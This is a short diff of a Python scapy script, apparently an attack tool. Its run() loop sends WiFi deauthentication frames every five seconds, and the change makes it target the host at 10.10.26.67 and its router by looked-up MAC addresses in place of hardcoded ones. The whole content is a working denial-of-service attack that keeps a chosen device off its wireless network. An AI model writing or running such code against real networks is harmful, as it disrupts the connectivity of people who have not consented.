@@ -1,12 +1,13 @@
 from scapy.all import *
 from scapy.layers.dot11 import *
+import net_tools as nt
 
 def init(host_socket):
     pass
 
 def run(cmd):
     while True:
-        deauth("b4:0b:1d:c4:71:ab", "00:1b:17:00:01:41")
+        deauth(nt.get_mac_address("10.10.26.67"), nt.get_router_mac())
         time.sleep(5)
 
 
